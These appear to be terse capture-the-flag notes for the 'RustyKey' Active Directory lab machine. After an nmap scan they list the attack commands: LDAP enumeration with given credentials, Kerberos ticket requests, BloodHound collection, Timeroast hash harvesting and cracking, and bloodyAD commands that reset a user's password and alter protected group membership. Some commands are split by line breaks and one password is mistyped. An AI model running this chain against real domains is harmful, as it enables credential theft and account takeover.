# Enumeration 
## Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-03 03:33:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-03T03:34:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h01m57s
```


ldapsearch -x -H ldap://10.10.11.75 -D 'rr.parker' -w '8#t5HE8L!W3A' -b "dc=rustykey,dc=htb" "(objectClass=user)" userPrincipalName

domain controller : rustykey.htb
user : rr.parker
password : 8#t5HE8L!W3A

```bash
impacket-getTGT -dc-ip 10.10.xx.xx rustykey.htb/rr.parker:'8#t5HE8L!
W3A'
```

```bash
export KRB5CCNAME=rr.parker.ccache

klist
```

```bash
bloodhound-python -u 'rr.parker' -p '8#t5HEL!W3A' -c All -d rustykey.htb -ns 10.10.xx.xx --zip -k
```

```
git clone https://github.com/SecuraBV/Timeroast.git
```

```
python3 Timeroast/timeroast.py 10.10.11.75 -o rustykey.hashes
```

python3 Timeroast/extra-scripts/timecrack.py rustykey.hashes /usr/s
hare/wordlists/rockyou.txt

password: Rusty88!


```bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password BB.MORGAN 'P@ssword123'
```

```bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'IT'
```

impacket-getTGT 'RUSTYKEY.HTB/BB.MORGAN:P@ssword123'
